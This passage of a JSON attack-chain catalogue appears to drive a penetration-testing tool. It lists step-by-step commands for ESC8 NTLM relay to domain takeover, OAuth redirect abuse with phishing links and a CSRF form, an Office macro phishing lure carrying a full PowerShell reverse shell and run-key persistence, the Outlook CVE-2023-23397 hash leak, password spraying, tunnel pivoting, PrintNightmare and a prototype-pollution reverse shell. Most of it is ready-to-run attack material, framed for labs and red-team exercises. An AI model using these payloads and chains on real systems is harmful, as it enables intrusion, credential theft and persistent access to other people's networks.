          "reason": "Most admin panels include uploads."
        },
        {
          "chain": "ssti-to-rce",
          "when": "admin panel templates user input",
          "reason": "Templated admin output → SSTI."
        }
      ]
    },
    {
      "id": "ntlm-relay-adcs",
      "name": "Coerce → NTLM Relay → ADCS (ESC8) → DC Hash",
      "description": "Classic ESC8 chain. Start a relay listener pointed at the ADCS web enrollment endpoint, coerce the DC into authenticating to you, capture a certificate as the DC, then use that certificate to PKINIT-auth and recover the DC's NT hash.\n",
      "tags": [
        "adcs",
        "esc8",
        "ntlm-relay",
        "coercion",
        "certificates",
        "active-directory"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "description": "Target DC IP (the one we coerce).",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "adcs_ip",
          "description": "IP of the ADCS server hosting /certsrv/.",
          "required": true
        },
        {
          "name": "listener_ip",
          "description": "Your attacker IP — where ntlmrelayx is listening.",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain"
        }
      ],
      "steps": [
        {
          "id": "relay_listener",
          "name": "Start the relay to ADCS web enrollment",
          "notes": "Run this FIRST and leave it running. The DomainController template is\na safe default; some environments use Machine or DomainControllerAuthentication.\n",
          "command_ref": "ntlmrelayx-adcs",
          "inputs": {
            "ip": "${adcs_ip}",
            "template": "DomainController"
          },
          "capture": [
            {
              "var": "dc_pfx",
              "regex": "Base64 certificate of user[^:]*:\\s*([A-Za-z0-9+/=]+)",
              "match": "first"
            },
            {
              "var": "dc_pfx_file",
              "regex": "Saving PFX to ([^\\s]+\\.pfx)",
              "match": "first"
            }
          ]
        },
        {
          "id": "coerce_auth",
          "name": "Coerce the DC into authenticating to your listener",
          "notes": "PetitPotam, DFSCoerce, PrinterBug — Coercer tries them all. The DC\nwill then hit /certsrv/, get relayed by ntlmrelayx, and a cert pops\nout in the listener window above.\n",
          "command_ref": "coercer",
          "inputs": {
            "listener_ip": "${listener_ip}",
            "target_ip": "${dc_ip}"
          }
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate with the DC certificate",
          "notes": "certipy auth performs PKINIT, returns both a TGT and the DC's NT hash.\nOnce you have the NT hash you own the domain.\n",
          "command_ref": "certipy-auth",
          "requires": [
            "dc_pfx_file"
          ],
          "inputs": {
            "pfx_file": "${dc_pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dump_with_dc_hash",
          "name": "DCSync with the DC machine account",
          "command_ref": "secretsdump",
          "requires": [
            "dc_nt_hash"
          ],
          "notes": "Use the DC machine-account hash (computername$) with secretsdump in\nits NTLM-hash variation to DCSync every credential in the domain.\n"
        }
      ],
      "references": [
        {
          "title": "ESC8 — SpecterOps ADCS Attacks",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        },
        {
          "title": "Coercer",
          "url": "https://github.com/p0dalirius/Coercer"
        },
        {
          "title": "Certipy",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "DA hash → Golden Ticket."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Spread the DA hash."
        }
      ]
    },
    {
      "id": "oauth-redirect-uri-abuse",
      "name": "Web — OAuth redirect_uri / state abuse → account takeover",
      "description": "OAuth 2.0 implementations commonly mis-validate `redirect_uri` (open redirect, subdomain wildcard, path-traversal) — attacker captures the authorization code / access token meant for the victim's account. Bonus: missing or static `state` enables full CSRF on the OAuth flow.\n",
      "tags": [
        "web",
        "oauth",
        "sso",
        "redirect-uri",
        "account-takeover"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "oauth_authorize_url",
          "description": "Authorization endpoint (e.g. https://auth.target.com/oauth/authorize).",
          "required": true
        },
        {
          "name": "client_id",
          "description": "Public client_id of the legitimate app.",
          "required": true
        },
        {
          "name": "legitimate_redirect_uri",
          "description": "The redirect_uri the app normally uses.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "enumerate_validations",
          "name": "Probe redirect_uri validation rules",
          "inline_command": "# Try each variant and check whether the IDP issues a code:\n# 1) Open redirect on the registered domain:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=<legit>/../attacker.com&state=x\"\n# 2) Subdomain bypass (if *.target.com is registered):\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=https://attacker.target.com&state=x\"\n# 3) Path traversal:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=<legit>/../../redirect?to=attacker.com&state=x\"\n# 4) URL encoded host:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=https%3A%2F%2Fattacker.com&state=x\"\n# 5) @ trick:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=https://<legit-host>@attacker.com&state=x\"\n",
          "inputs": {
            "auth": "${oauth_authorize_url}",
            "cid": "${client_id}",
            "legit": "${legitimate_redirect_uri}"
          },
          "notes": "Any 302 to attacker.com (or any path containing the auth code)\nindicates a working bypass. Save the exact payload that worked.\n"
        },
        {
          "id": "craft_full_phish",
          "name": "Craft the phishing URL that captures the code",
          "inline_command": "# Once you have a working redirect_uri bypass:\necho 'Send this URL to the victim:'\necho '<auth>?response_type=code&client_id=<cid>&redirect_uri=https://attacker.com/callback&state=x&scope=openid+profile+email'\n# On click → IDP grants code → redirects to attacker.com/callback?code=AUTHORIZATION_CODE\n",
          "inputs": {
            "auth": "${oauth_authorize_url}",
            "cid": "${client_id}"
          }
        },
        {
          "id": "exchange_code",
          "name": "Exchange captured code for an access token",
          "inline_command": "curl -X POST '<token_endpoint>' \\\n  -d 'grant_type=authorization_code' \\\n  -d 'code=<CAPTURED_CODE>' \\\n  -d 'client_id=<cid>' \\\n  -d 'redirect_uri=https://attacker.com/callback'\n",
          "inputs": {
            "cid": "${client_id}"
          },
          "notes": "Public clients (PKCE) won't need a client_secret. Confidential clients\ndo — but you might not need to exchange at all; many apps use the\ncode itself as a session token in their callback path.\n",
          "capture": [
            {
              "var": "oauth_access_token",
              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
              "match": "first"
            }
          ]
        },
        {
          "id": "state_csrf",
          "name": "If state is empty/static — CSRF the entire flow",
          "inline_command": "# Build an HTML auto-submit form pointing at /oauth/callback?code=<your_code>:\ncat > csrf-oauth.html <<'EOF'\n<html><body onload=\"document.forms[0].submit()\">\n<form action=\"https://victim-app.com/oauth/callback\" method=\"GET\">\n  <input name=\"code\" value=\"ATTACKER_CODE\">\n  <input name=\"state\" value=\"\">\n</form>\n</body></html>\nEOF\n# Lure victim → their session ends up bound to YOUR account.\n",
          "notes": "Same primitive used in account-merge attacks: log in as victim into\nattacker's account → linked → attacker now owns victim's data.\n"
        },
        {
          "id": "use_token",
          "name": "Use the access token against the API",
          "inline_command": "curl 'https://api.target.com/me' \\\n  -H 'Authorization: Bearer <token>'\n",
          "inputs": {
            "token": "${oauth_access_token}"
          }
        }
      ],
      "references": [
        {
          "title": "PortSwigger — OAuth",
          "url": "https://portswigger.net/web-security/oauth"
        },
        {
          "title": "HackTricks — OAuth",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html"
        }
      ],
      "next_chains": [
        {
          "chain": "jwt-attacks",
          "when": "token is a JWT",
          "reason": "Inspect/forge the JWT once captured."
        },
        {
          "chain": "csrf-and-token-leak",
          "when": "state CSRF surfaces login flow weaknesses",
          "reason": "Chain with broader CSRF for fuller takeover."
        }
      ]
    },
    {
      "id": "office-macro-initial-access",
      "name": "Phishing — Office macro initial access → C2 shell",
      "description": "Classic phishing chain. .docm with a VBA AutoOpen handler pulls down a PowerShell stager (or Cobalt Strike / Sliver / Mythic beacon) and runs in the user's context. Useful for red-team exercises and HTB \"Reel\" style boxes.\n",
      "tags": [
        "phishing",
        "initial-access",
        "office-macro",
        "vba",
        "classic-windows"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "lure_subject",
          "description": "Email subject for the lure.",
          "required": true
        },
        {
          "name": "target_email",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "payload_choice",
          "name": "Pick the payload (PowerShell vs Beacon)",
          "inline_command": "echo 'PowerShell oneliner — fastest, no C2.\\nMythic / Sliver / CS beacon — full C2, persistence, lateral.\\nFor CTFs: powershell -nop -w hidden -enc <base64> is enough.'"
        },
        {
          "id": "craft_macro",
          "name": "Craft the VBA AutoOpen macro",
          "inline_command": "cat > /tmp/macro.bas <<'EOF'\nSub AutoOpen()\n    Shell \"powershell.exe -nop -w hidden -enc <BASE64_OF_REVERSE_SHELL>\"\nEnd Sub\nSub Document_Open()\n    AutoOpen\nEnd Sub\nEOF\n# Encode the PS:\necho '$client = New-Object System.Net.Sockets.TCPClient(\"<lhost>\",<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0\n",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        },
        {
          "id": "build_docm",
          "name": "Build the .docm with the macro embedded",
          "inline_command": "# Easiest: open LibreOffice → new document → Tools → Macros → paste,\n# save as .docm with the macro signature.\n# Or generate from CLI with macropack:\npip install macropack\nmacropack -m /tmp/macro.bas -t WORD -o /tmp/invoice_q3.docm\n"
        },
        {
          "id": "send_lure",
          "name": "Send the lure email",
          "inline_command": "swaks --server '<smtp>' --to '<email>' \\\n  --from 'accounting@trusted-vendor.com' \\\n  --header 'Subject: <subject>' \\\n  --body 'Hi, please find the attached Q3 invoice.' \\\n  --attach /tmp/invoice_q3.docm \\\n  --attach-name 'Invoice-Q3.docm'\n",
          "inputs": {
            "smtp": "<smtp_server>",
            "email": "${target_email}",
            "subject": "${lure_subject}"
          }
        },
        {
          "id": "catch_shell",
          "name": "Catch the reverse shell",
          "inline_command": "rlwrap nc -lvnp <lport>",
          "inputs": {
            "lport": "4444"
          }
        },
        {
          "id": "persistence_immediate",
          "name": "Quick persistence (run-key) before the user logs out",
          "inline_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Updater\" /t REG_SZ /d \"powershell -nop -w hidden -enc <BASE64>\" /f\n"
        }
      ],
      "references": [
        {
          "title": "MITRE T1204.002 (User Execution: Malicious File)",
          "url": "https://attack.mitre.org/techniques/T1204/002/"
        },
        {
          "title": "HackTricks — Phishing methodology",
          "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/index.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "PowerShell shell received",
          "reason": "Stabilize before doing AD work."
        },
        {
          "chain": "dpapi-secrets-extraction",
          "when": "shell on a workstation",
          "reason": "User context has DPAPI of the logged-on user."
        },
        {
          "chain": "ldap-anonymous-enum",
          "when": "shell on a domain-joined host",
          "reason": "Start AD enumeration with the user context."
        }
      ]
    },
    {
      "id": "outlook-cve-2023-23397",
      "name": "Phishing — Outlook NTLM leak (CVE-2023-23397)",
      "description": "Outlook on Windows leaks an NTLM hash to any UNC path set in a calendar appointment's PidLidReminderFileParameter. Send the target a meeting invite, capture the NTLMv2 hash with Responder, crack offline → domain user creds.\n",
      "tags": [
        "phishing",
        "outlook",
        "ntlm-leak",
        "cve-2023-23397",
        "initial-access"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_email",
          "description": "Victim's email address.",
          "required": true
        },
        {
          "name": "smtp_server",
          "description": "SMTP server you control or relay through.",
          "required": true
        },
        {
          "name": "listener_ip",
          "description": "Your attacker IP (Responder/ntlmrelayx must listen here).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "start_responder",
          "name": "Start Responder to capture NTLMv2",
          "inline_command": "sudo responder -I tun0 -wF",
          "notes": "`-w` brings up the WPAD + SMB servers; `-F` enables NTLMv1 negotiation\ndowngrade attempts. Watch the SMB section — that's where the leak\nwill land.\n"
        },
        {
          "id": "craft_calendar_invite",
          "name": "Craft the malicious .msg / .eml with UNC reminder",
          "inline_command": "python3 CVE-2023-23397.py \\\n  --sender attacker@evilcorp.com \\\n  --recipient '<target_email>' \\\n  --uncpath '\\\\<listener_ip>\\share\\sound.wav' \\\n  --output evil_invite.msg\n",
          "inputs": {
            "target_email": "${target_email}",
            "listener_ip": "${listener_ip}"
          },
          "notes": "The trick is `PidLidReminderFileParameter` pointing to your SMB\nshare with `\\\\` (UNC). When the reminder fires, Outlook tries to\nplay the sound → SMB auth → NTLMv2 to your Responder. The user\ndoesn't have to click anything; the reminder fires automatically.\n"
        },
        {
          "id": "send_invite",
          "name": "Send the invite via SMTP",
          "inline_command": "swaks --server '<smtp>' --to '<email>' --from 'attacker@evilcorp.com' \\\n  --header 'Subject: Quick sync tomorrow' --attach evil_invite.msg\n",
          "inputs": {
            "smtp": "${smtp_server}",
            "email": "${target_email}"
          }
        },
        {
          "id": "capture_hash",
          "name": "Capture NTLMv2 in Responder",
          "inline_command": "tail -f /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt",
          "capture": [
            {
              "var": "ntlmv2_hash",
              "regex": "^([^:]+::[^:]+:[a-f0-9]{16}:[a-f0-9]{32}:[A-Za-z0-9+/=]+)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "crack",
          "name": "Crack the NTLMv2 hash",
          "command_ref": "hashcat-ntlmv2",
          "requires": [
            "ntlmv2_hash"
          ]
        },
        {
          "id": "relay_alternative",
          "name": "Alternative: skip the crack — relay directly",
          "inline_command": "impacket-ntlmrelayx -t ldaps://<dc> --shadow-credentials --shadow-target '<target_user>'",
          "notes": "If LDAP signing isn't enforced, the leaked NTLMv2 can be relayed in\nreal time to LDAPS → write a KeyCredentialLink on the target →\nPKINIT chain. See ldap-relay-shadow-cred for full details.\n"
        }
      ],
      "references": [
        {
          "title": "CVE-2023-23397 (MDSec)",
          "url": "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
        },
        {
          "title": "Microsoft advisory",
          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397"
        }
      ],
      "next_chains": [
        {
          "chain": "password-spray",
          "when": "cracked plaintext",
          "reason": "Cracked password → spray to find Pwn3d! hosts."
        },
        {
          "chain": "ldap-relay-shadow-cred",
          "when": "NTLMv2 captured AND LDAPS reachable",
          "reason": "Relay it instead of cracking — instant Shadow Cred takeover."
        }
      ]
    },
    {
      "id": "password-spray",
      "name": "Cred Access — password spraying (low & slow)",
      "description": "Spray a small candidate list against the user pool harvested in recon. Read the password policy first to size the batch and stay under the lockout threshold — getting an account locked out on an OSCP machine burns the box.\n",
      "tags": [
        "credential-access",
        "password-spray",
        "smb",
        "ldap"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain"
        }
      ],
      "steps": [
        {
          "id": "policy_check",
          "name": "Password policy (lockout threshold!)",
          "inline_command": "nxc smb <ip> -u '' -p '' --pass-pol",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "Lockout count tells you how many bad attempts per account before lockout.\nSpray 1 password per round; sleep 30+ minutes between rounds if\nlockoutWindow > 0.\n"
        },
        {
          "id": "build_candidates",
          "name": "Build candidate passwords",
          "inline_command": "printf '%s\\n' Welcome1 Password1 Summer2024! Spring2025! '<Company>2024!' Passw0rd! P@ssw0rd > spray.txt",
          "notes": "Replace `<Company>` with actual org name from web/SMB recon. Most\ndomain users pick season+year or company+year. Avoid >5 unless\nlockout is disabled.\n"
        },
        {
          "id": "spray_smb",
          "name": "Spray candidates via SMB",
          "command_ref": "nxc-smb-spray",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "`[+] DOMAIN\\\\user:password` lines = hits. Auto-extract picks them up\nas cracked_creds for downstream chains.\n",
          "capture": [
            {
              "var": "spray_hits",
              "regex": "\\[\\+\\]\\s+\\S+\\\\([A-Za-z0-9._-]+):(\\S+)",
              "match": "all",
              "groups": {
                "user": 1,
                "password": 2
              }
            }
          ]
        },
        {
          "id": "validate_hit",
          "name": "Validate winning credential",
          "command_ref": "nxc-smb-auth",
          "requires": [
            "spray_hits"
          ],
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "Re-run with the single hit to confirm + check (Pwn3d!) marker for\nlocal-admin rights. If Pwn3d! → straight to evil-winrm / atexec.\n"
        }
      ],
      "references": [
        {
          "title": "The Hacker Recipes — Password Spray",
          "url": "https://www.thehacker.recipes/ad/movement/credentials/dumping/spray"
        },
        {
          "title": "NetExec — bruteforce",
          "url": "https://www.netexec.wiki/getting-started/bruteforce"
        }
      ],
      "next_chains": [
        {
          "chain": "ldap-anonymous-enum",
          "when": "spray_hits captured",
          "reason": "Re-run LDAP enum AUTHENTICATED — you see more."
        },
        {
          "chain": "gpp-cpassword-recovery",
          "when": "spray_hits captured",
          "reason": "Now authenticate and grep SYSVOL."
        },
        {
          "chain": "esc1-adcs-takeover",
          "when": "spray_hits + AD CS reachable",
          "reason": "Hunt for ESC1 templates with the new identity."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "spray_hits give a Pwn3d!",
          "reason": "Spread further if the new creds are local admin."
        }
      ]
    },
    {
      "id": "pivoting-chisel-ligolo",
      "name": "Pivoting — reverse tunnel through compromised host (chisel / ligolo-ng)",
      "description": "You popped a perimeter host and now need to reach an internal subnet that's not routable from your attacker box. Spin a reverse SOCKS or layer-2 tunnel through the foothold and stop fighting the firewall.\n",
      "tags": [
        "pivoting",
        "tunneling",
        "post-exploitation",
        "networking"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "foothold_ip",
          "description": "IP you compromised (the host that has access to the internal subnet).",
          "required": true
        },
        {
          "name": "internal_cidr",
          "description": "Subnet you want to reach from your attacker box (e.g. 10.0.0.0/24).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "pick_method",
          "name": "Pick the tunneling method",
          "inline_command": "echo '— chisel: SOCKS5 proxy, easy, works for any TCP\n— ligolo-ng: full L3 tunnel (use any tool natively, no proxychains)\n— sshuttle: poor-man\\'s VPN if SSH access\n— socat: single-port forward when that\\'s all you need'",
          "notes": "chisel is the safest default. ligolo-ng is more powerful (real L3\ntunnel) but needs root on the attacker side to create the TUN.\nsshuttle if you have SSH on the foothold — zero install on victim.\n"
        },
        {
          "id": "chisel_setup",
          "name": "chisel (SOCKS5 reverse tunnel)",
          "inline_command": "# Attacker:\n./chisel server --reverse --port 8000\n# Victim:\n./chisel client <attacker_ip>:8000 R:1080:socks\n# Attacker — verify and use:\ncurl --socks5 127.0.0.1:1080 http://<internal_ip>/\n# Then proxychains-ng:\nsed -i 's/socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains.conf\nproxychains4 nxc smb <internal_cidr> -u <user> -p <password>\n",
          "inputs": {
            "attacker_ip": "${attacker_ip}",
            "internal_cidr": "${internal_cidr}"
          }
        },
        {
          "id": "ligolo_setup",
          "name": "ligolo-ng (full L3 tunnel — no proxychains)",
          "inline_command": "# Attacker (one-time):\nsudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add <internal_cidr> dev ligolo\n./proxy -selfcert -laddr 0.0.0.0:11601\n# Victim:\n./agent -connect <attacker_ip>:11601 -ignore-cert\n# Attacker — at the ligolo prompt:\nsession\nstart\n# Now use any tool natively:\nnmap -sV -p 445,3389 <internal_cidr>\nevil-winrm -i <internal_ip> ...\n",
          "inputs": {
            "attacker_ip": "${attacker_ip}",
            "internal_cidr": "${internal_cidr}"
          }
        },
        {
          "id": "sshuttle_setup",
          "name": "sshuttle (poor-man's VPN over SSH)",
          "inline_command": "sshuttle -r <user>@<foothold_ip> <internal_cidr>\n# Now any TCP/UDP to that subnet routes through the SSH tunnel.\n",
          "inputs": {
            "foothold_ip": "${foothold_ip}",
            "internal_cidr": "${internal_cidr}"
          }
        },
        {
          "id": "validate_pivot",
          "name": "Verify reachability",
          "inline_command": "# Pick a likely internal target and probe it:\nproxychains4 nmap -sT -Pn -n -p 22,80,443,445,3389 <internal_ip>\n# Or directly (if using ligolo / sshuttle):\nnmap -sT -Pn -n -p 22,80,443,445,3389 <internal_ip>\n"
        },
        {
          "id": "persistence_for_pivot",
          "name": "Keep the tunnel alive — systemd / scheduled task",
          "inline_command": "# On the victim (long-running engagement), wrap the client in a\n# systemd unit / scheduled task so it survives reboots.\n# Example (Linux):\nsudo tee /etc/systemd/system/chisel-client.service <<'EOF'\n[Unit]\nDescription=chisel client\nAfter=network-online.target\n[Service]\nExecStart=/opt/chisel client <attacker_ip>:8000 R:1080:socks\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsudo systemctl enable --now chisel-client\n"
        }
      ],
      "references": [
        {
          "title": "chisel",
          "url": "https://github.com/jpillora/chisel"
        },
        {
          "title": "ligolo-ng",
          "url": "https://github.com/nicocha30/ligolo-ng"
        },
        {
          "title": "sshuttle",
          "url": "https://github.com/sshuttle/sshuttle"
        }
      ],
      "next_chains": [
        {
          "chain": "nmap-recon",
          "when": "tunnel up",
          "reason": "Repeat recon — but now against the internal subnet."
        },
        {
          "chain": "smb-null-session-enum",
          "when": "SMB open on an internal host",
          "reason": "Restart the AD attack tree against the internal network."
        }
      ]
    },
    {
      "id": "printnightmare-cve-2021-1675",
      "name": "Windows — PrintNightmare (CVE-2021-1675 / 34527) SYSTEM",
      "description": "Print Spooler service loads attacker-supplied printer drivers as SYSTEM. Local privesc from any authenticated user; remote from low-priv domain user against any host running spooler. Patched mid-2021 but still ubiquitous on labs and unpatched servers.\n",
      "tags": [
        "windows",
        "priv-esc",
        "printnightmare",
        "cve-2021-1675",
        "cve-2021-34527",
        "classic-windows"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_ip",
          "description": "Target host with the Print Spooler service running.",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user"
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "spooler_check",
          "name": "Confirm Spooler is running",
          "command_ref": "nxc-smb-printnightmare",
          "inputs": {
            "ip": "${target_ip}"
          },
          "notes": "The module probes for an open Spooler RPC interface AND tries the\nvuln check. `[+] VULNERABLE` is the green light. If patched, the\nmodule says so explicitly.\n"
        },
        {
          "id": "stage_payload_dll",
          "name": "Stage a SYSTEM-spawning DLL on a writable share",
          "inline_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o /tmp/x.dll\n# Host on an SMB share readable by SYSTEM:\nimpacket-smbserver share /tmp -smb2support\n",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        },
        {
          "id": "trigger_local",
          "name": "Local exploit (any logged-in user)",
          "inline_command": "# CubeSec PowerShell PoC:\npowershell -ep bypass -c \"iex (iwr https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1).Content; Invoke-Nightmare -DriverName 'PwnedDriver' -NewUser 'pwned' -NewPassword 'Pwn3d!CTF'\"\n",
          "notes": "Creates a local admin `pwned`/`Pwn3d!CTF`. Then runas /user:pwned cmd.\n"
        },
        {
          "id": "trigger_remote",
          "name": "Remote exploit (low-priv domain user)",
          "inline_command": "python3 CVE-2021-1675.py '<domain>/<user>:<password>'@<target> '\\\\<attacker_ip>\\share\\x.dll'\n",
          "inputs": {
            "domain": "${user}",
            "user": "${user}",
            "password": "${password}",
            "target": "${target_ip}",
            "attacker_ip": "${attacker_ip}"
          },
          "notes": "Spooler on the target reaches back to your SMB share, downloads\nx.dll, loads it as SYSTEM. Reverse shell pops back as NT AUTHORITY\\SYSTEM.\n"
        },
        {
          "id": "catch_shell",
          "name": "Catch the SYSTEM reverse shell",
          "inline_command": "nc -lvnp <lport>",
          "inputs": {
            "lport": "4444"
          }
        },
        {
          "id": "confirm",
          "name": "Confirm SYSTEM",
          "inline_command": "whoami"
        }
      ],
      "references": [
        {
          "title": "PrintNightmare write-up (cube0x0)",
          "url": "https://github.com/cube0x0/CVE-2021-1675"
        },
        {
          "title": "CVE-2021-34527",
          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "reason": "SYSTEM → loot the box."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "NTLM hashes captured locally",
          "reason": "Spread the harvested identities."
        }
      ]
    },
    {
      "id": "prototype-pollution-rce",
      "name": "Web — JavaScript prototype pollution → RCE",
      "description": "Server-side Node apps that recursively merge user input into objects (lodash.merge, jQuery.extend(true), $.extend) can have Object.prototype poisoned. Many libraries then read that polluted property as a config knob → flip it to spawn a shell.\n",
      "tags": [
        "web",
        "javascript",
        "nodejs",
        "prototype-pollution",
        "rce"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "target_url",
          "description": "Endpoint that accepts JSON and merges it into objects (often /api/profile, /api/settings).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "detect_pollution",
          "name": "Detect pollution via __proto__",
          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"polluted\":\"yes\"}}'\n# Then fetch any endpoint that returns a fresh object and check whether\n# the response unexpectedly includes \"polluted\":\"yes\".\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Some apps strip `__proto__`. Try `constructor.prototype` instead:\n  {\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}\n"
        },
        {
          "id": "blind_detection",
          "name": "Blind detection: pollute toString, watch for crash",
          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"toString\":7}}'\n",
          "notes": "If the next request fails with `TypeError: ... toString is not a function`\n→ confirmed pollution.\n"
        },
        {
          "id": "rce_via_argv",
          "name": "RCE via child_process gadget (most common payload)",
          "inline_command": "# Many apps use child_process.spawn(...) with no options.shell;\n# polluting Object.prototype.shell = '/usr/bin/bash' (or true) +\n# NODE_OPTIONS gives RCE on the next spawn.\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"shell\":true,\"argv0\":\"sh\"}}'\n",
          "inputs": {
            "url": "${target_url}"
          }
        },
        {
          "id": "rce_via_env",
          "name": "RCE via NODE_OPTIONS env var pollution",
          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"NODE_OPTIONS\":\"--inspect-brk=0.0.0.0:9229 --require /tmp/payload.js\"}}'\n# Then either trigger any child_process call OR connect to inspect port:\n# chromium chrome://inspect → expose attach → RCE.\n"
        },
        {
          "id": "gadget_lookup",
          "name": "Find a known gadget for this app's framework",
          "inline_command": "git clone https://github.com/BlackFan/client-side-prototype-pollution /tmp/cspp\n# And:\ngit clone https://github.com/yeswehack/pp-finder /tmp/pp-finder\n# The repos catalog gadgets per framework (Express, NestJS, Next.js, etc.)\n# Pick the one matching the target's stack and tailor the pollution payload.\n"
        },
        {
          "id": "confirm_rce",
          "name": "Trigger a reverse shell",
          "inline_command": "# After pollution, trigger any endpoint that does spawn/exec internally.\n# Combined gadget example for Express (lodash.merge + NODE_OPTIONS):\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\":{\"AppData\":\"\\\\\\\".concat(process.mainModule.require(\\\"child_process\\\").execSync(\\\"bash -c \\\\\\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\\\\\"\\\")).concat(\\\".\"}}'\n",
          "inputs": {
            "url": "${target_url}",
            "lhost": "${attacker_ip}",
            "lport": "4444"
          }
        }
      ],
      "references": [
        {
          "title": "PortSwigger — Prototype pollution",
          "url": "https://portswigger.net/web-security/prototype-pollution"
        },
        {
          "title": "client-side-prototype-pollution gadgets",
          "url": "https://github.com/BlackFan/client-side-prototype-pollution"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell on Node host",
          "reason": "Escalate from node user."
        }
      ]
    },
    {
      "id": "pth-lateral-spread",
      "name": "Lateral — Pass-the-Hash spread + Pwn3d! discovery",
      "description": "With a captured NTLM hash, sweep every reachable Windows host to find where the principal has local-admin (the famous `(Pwn3d!)` marker), then open a shell on the first hit. Bread-and-butter lateral movement.\n",
      "tags": [
        "pass-the-hash",
        "lateral-movement",
        "pwn3d",
        "smb",
        "winrm"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "target_subnet",
          "description": "CIDR or single IP — usually the AD subnet.",
          "required": true
        },
        {
          "name": "user",
          "description": "The principal that owns the NT hash.",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "hash",
          "description": "Captured NTLM hash (32 hex chars or LM:NT).",
          "source": "target_context.hash",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain"
        }
      ],
      "steps": [
        {
          "id": "spray_hash_smb",
          "name": "Sweep SMB with the hash, look for Pwn3d!",
